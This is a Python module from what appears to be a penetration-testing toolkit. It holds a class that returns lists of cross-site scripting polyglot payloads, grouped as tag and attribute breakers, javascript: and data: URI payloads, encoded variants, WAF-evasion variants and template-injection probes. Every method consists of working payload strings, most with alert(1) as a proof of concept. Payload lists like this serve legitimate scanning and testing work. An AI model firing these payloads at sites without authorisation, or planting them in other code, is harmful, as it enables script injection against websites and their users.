#!/usr/bin/env python3

"""
Polyglot XSS Payloads

Universal payloads that work in multiple contexts.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class PolyglotPayloads:
    """Polyglot XSS payload collection"""
    
    @staticmethod
    def get_classic_polyglots() -> List[str]:
        """Classic polyglot payloads that work in multiple contexts"""
        return [
            # Mario Heiderich's polyglot
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
            
            # Extended polyglots
            'javascript:/*--></title></style></textarea></script></xmp><img/src=x onerror=alert(1)>',
            'javascript:/*--></title></style></textarea></script></xmp><iframe/src=javascript:alert(1)>',
            'javascript:/*--></title></style></textarea></script></xmp><body/onload=alert(1)>',
            
            # HTML comment breaking polyglots
            '--></script><script>alert(1)</script><!--',
            '--></style><script>alert(1)</script><!--',
            '--></textarea><script>alert(1)</script><!--',
            '--></title><script>alert(1)</script><!--',
            '--></xmp><script>alert(1)</script><!--',
            
            # CSS breaking polyglots
            '*/alert(1);/*',
            '*/</style><script>alert(1)</script>/*',
            '*/{background:url(javascript:alert(1))}/*',
            
            # Attribute breaking polyglots
            '" onclick="alert(1)" "',
            '\' onclick=\'alert(1)\' \'',
            '" onfocus="alert(1)" autofocus="',
            '\' onfocus=\'alert(1)\' autofocus=\'',
        ]
    
    @staticmethod
    def get_advanced_polyglots() -> List[str]:
        """polyglot payloads with multiple escape techniques"""
        return [
            # Multi-context escapes
            '</script><script>alert(1)</script>',
            '</style><script>alert(1)</script>',
            '</textarea><script>alert(1)</script>',
            '</title><script>alert(1)</script>',
            '</noscript><script>alert(1)</script>',
            '</comment><script>alert(1)</script>',
            
            # Quote and tag breaking
            '\';alert(1);//',
            '\";alert(1);//',
            '`;alert(1);//',
            '\'></script><script>alert(1)</script>',
            '\"</script><script>alert(1)</script>',
            '`</script><script>alert(1)</script>',
            
            # Event handler polyglots
            '" onmouseover="alert(1)" autofocus="',
            '\' onmouseover=\'alert(1)\' autofocus=\'',
            '" onfocus="alert(1)" autofocus onclick="alert(1)" "',
            '\' onfocus=\'alert(1)\' autofocus onclick=\'alert(1)\' \'',
            
            # URL breaking polyglots
            'javascript:alert(1)//\\',
            'javascript:alert(1)/*',
            'javascript:alert(1);void(0)',
            'javascript:alert(1)&amp;',
            
            # Data URI polyglots
            'data:text/html,<script>alert(1)</script>',
            'data:text/html,<svg onload=alert(1)>',
            'data:text/html,<img src=x onerror=alert(1)>',
            'data:text/html,<body onload=alert(1)>',
        ]
    
    @staticmethod
    def get_protocol_polyglots() -> List[str]:
        """Protocol-based polyglot payloads"""
        return [
            # JavaScript protocol variations
            'javascript:alert(1)',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'javascript:eval("alert(1)")',
            'javascript:prompt(1)',
            'javascript:confirm(1)',
            'javascript:void(alert(1))',
            'javascript:throw(alert(1))',
            
            # Alternative protocols
            'vbscript:alert(1)',
            'livescript:alert(1)',
            'mocha:alert(1)',
            'tcl:alert(1)',
            
            # Data protocols
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'data:text/html,<svg onload=alert(1)>',
            'data:text/html,<img src=x onerror=alert(1)>',
            'data:text/html,<body onload=alert(1)>',
            'data:text/html,<iframe src=javascript:alert(1)>',
            
            # Mixed protocols
            'javascript:/**/alert(1)',
            'javascript://alert(1)',
            'javascript:void%20alert(1)',
            'javascript:alert%281%29',
        ]
    
    @staticmethod
    def get_encoding_polyglots() -> List[str]:
        """Encoding-resistant polyglot payloads"""
        return [
            # HTML entity resistant
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            
            # URL encoding resistant
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '%3Cimg%20src=x%20onerror=alert(1)%3E',
            '%3Csvg%20onload=alert(1)%3E',
            
            # Unicode resistant
            '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',
            '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
            
            # Mixed encoding
            '%3Cscr&#105;pt%3Ealert(1)%3C/scr&#105;pt%3E',
            '&#60;scr%69pt&#62;alert(1)&#60;/scr%69pt&#62;',
            '&lt;scr\\x69pt&gt;alert(1)&lt;/scr\\x69pt&gt;',
            
            # Base64 resistant
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==',
            'data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+',
        ]
    
    @staticmethod
    def get_waf_resistant_polyglots() -> List[str]:
        """WAF-resistant polyglot payloads"""
        return [
            # Case variation resistant
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=x ONERROR=alert(1)>',
            '<SVG ONLOAD=alert(1)>',
            '<ScRiPt>ALeRt(1)</ScRiPt>',
            
            # Comment injection resistant
            '<script>/**/alert(1)</script>',
            '<script>alert/**/("1")</script>',
            '<script>alert(/**/"1")</script>',
            '<img src=x onerror=/**/alert(1)>',
            
            # Whitespace resistant
            '<script\x09>alert(1)</script>',
            '<script\x0A>alert(1)</script>',
            '<script\x0D>alert(1)</script>',
            '<script\x20>alert(1)</script>',
            
            # String fragmentation resistant
            '<script>eval("ale"+"rt(1)")</script>',
            '<script>window["ale"+"rt"](1)</script>',
            '<script>this["ale"+"rt"](1)</script>',
            '<script>[].constructor.constructor("alert(1)")()</script>',
            
            # Template literal resistant
            '<script>alert`1`</script>',
            '<script>eval`alert\\`1\\``</script>',
            '<script>Function`alert\\`1\\```</script>',
            
            # Alternative events resistant
            '<svg/onload=alert(1)>',
            '<img/src=x/onerror=alert(1)>',
            '<iframe/src=javascript:alert(1)>',
            '<body/onload=alert(1)>',
        ]
    
    @staticmethod
    def get_context_agnostic_polyglots() -> List[str]:
        """Context-agnostic polyglot payloads"""
        return [
            # Works in most HTML contexts
            '"><script>alert(1)</script>',
            '\"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '`><script>alert(1)</script>',
            '></script><script>alert(1)</script>',
            
            # Works in attribute contexts
            '" onmouseover="alert(1)" "',
            '\' onmouseover=\'alert(1)\' \'',
            '" onclick="alert(1)" "',
            '\' onclick=\'alert(1)\' \'',
            ' onmouseover=alert(1) ',
            ' onclick=alert(1) ',
            
            # Works in JavaScript contexts
            '\';alert(1);//',
            '\";alert(1);//',
            '`;alert(1);//',
            '\\x27;alert(1);//',
            '\\x22;alert(1);//',
            
            # Works in CSS contexts
            '}</style><script>alert(1)</script><style>',
            '*/</style><script>alert(1)</script><style>/*',
            'expression(alert(1))',
            'url(javascript:alert(1))',
            
            # Works in URL contexts
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
        ]
    
    @staticmethod
    def get_bypass_everything_polyglots() -> List[str]:
        """Ultimate bypass polyglots designed to work everywhere"""
        return [
            # The ultimate polyglot
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            
            # Extended ultimate polyglots
            '/**/alert(1)/**/;/**/\\n/**/\\r/**/\\t/**/\\f/**/\\v/**/\\0',
            '"><svg/onload=/**/alert(1)//>',
            '\';/*!*/alert(/*!*/1/*!*/)/*!*/;//',
            '`);alert(1);//',
            '${alert(1)}',
            
            # Multi-layer bypass
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
            '%3cscript%3ealert(1)%3c/script%3e',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            
            # Framework-agnostic
            '{{constructor.constructor(\'alert(1)\')()}}',
            '${7*7}{{7*7}}<%=7*7%>${{7*7}}#{7*7}',
            '[class^="alert(1)"]',
            
            # All-context breaker
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(/XSS/)>',
            'data:text/html,<script>alert(1)</script><!--',
            '"},alert(1),{"',
        ]
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all polyglot XSS payloads"""
        payloads = []
        payloads.extend(PolyglotPayloads.get_classic_polyglots())
        payloads.extend(PolyglotPayloads.get_advanced_polyglots())
        payloads.extend(PolyglotPayloads.get_protocol_polyglots())
        payloads.extend(PolyglotPayloads.get_encoding_polyglots())
        payloads.extend(PolyglotPayloads.get_waf_resistant_polyglots())
        payloads.extend(PolyglotPayloads.get_context_agnostic_polyglots())
        payloads.extend(PolyglotPayloads.get_bypass_everything_polyglots())
        return payloads